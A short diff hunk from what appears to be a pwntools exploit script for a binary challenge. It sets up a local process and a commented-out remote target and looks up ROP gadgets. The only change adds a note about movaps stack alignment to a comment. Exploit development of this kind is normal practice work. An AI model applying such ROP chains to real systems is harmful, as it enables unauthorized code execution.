@@ -24,7 +24,7 @@ io = elf.process()
 #io = pwn.remote("10.10.10.10", 1337)
 
 # Finding Gadgets
-pop_ret = rop.ret.address # Two bytes aligment required
+pop_ret = rop.ret.address # Two bytes aligment required (movaps)
 #pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
 pop_rdi = rop.rdi.address
 pop_rsi = rop.rsi.address
